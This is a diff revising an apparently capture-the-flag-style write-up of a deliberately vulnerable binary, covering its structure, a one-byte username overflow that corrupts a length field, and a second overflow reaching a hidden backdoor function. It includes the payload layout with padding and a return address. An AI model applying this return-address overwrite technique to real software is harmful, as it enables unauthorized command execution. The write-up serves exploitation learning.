@@ -2,9 +2,7 @@
 
 ## **Binary Analysis**
 
-When run, it displays a welcome message and then handles user input through the handle_msg() function.
-The program uses a structure to store a username (up to 40 characters) and a message (up to 140 characters). It first prompts the user to enter a username with the set_username() function, and then asks for a message via the set_msg() function.
-There's also an unused secret_backdoor() function that could read a command from the user and execute it, but this function is never called in the normal program flow.
+When executed, the program displays a welcome message and handles user input through the handle_msg() function. It uses a structure to store a username (up to 40 characters) and a message (up to 140 characters). The program first prompts the user to enter a username using the set_username() function, and then asks for a message via the set_msg() function. There is also an unused secret_backdoor() function that can read a command from the user and execute it, but this function is never called during the normal program flow.
 
 **main function:**
 ```bash
@@ -52,26 +50,26 @@ Uses the len value at offset 0xb4 (180) to control strncpy.
 
 ## **Vulnerability**
 
-**Two-Stage Buffer Overflow**
-
-The Vulnerabilities in this Program:
-Buffer Overflow:
-    The program is vulnerable to buffer overflow because it allows writing more data than the allocated space in the buffers (e.g., msg[140] and username[40]). If the user inputs more data than the buffer can hold, it will overwrite adjacent memory, potentially leading to crashes or security vulnerabilities.
-
-Command Injection:
-    The program uses system() to execute arbitrary commands input by the user. This introduces a command injection vulnerability, where an attacker can trick the program into executing unauthorized commands, potentially leading to a compromise of the system.
+The username buffer is 40 bytes long, and the length field is located at offset 40.
+A buffer overflow can occur, allowing 1 byte to be written beyond the username buffer, potentially modifying the length field.
+This modified length allows writing beyond the bounds of the message buffer, resulting in a second overflow.
+As a result, it is possible to overwrite the return address, which could lead to executing the secret_backdoor function.
 
 ## **Exploit**
 
 **Exploit Structure**
 
-```python
-# Stage 1: Username overflow
+
+Stage 1: Username overflow
+
+```bash
 "A" * 40       # Fill username buffer
 "\xff"         # Overwrite length byte to maximum
 "\n"           # Username input terminator
+```
+Stage 2: Message overflow
 
-# Stage 2: Message overflow
+```bash
 "B" * 200      # Padding to reach return address
 "\x8c\x48\x55\x55\x55\x55\x00\x00"  # secret_backdoor address
 ```
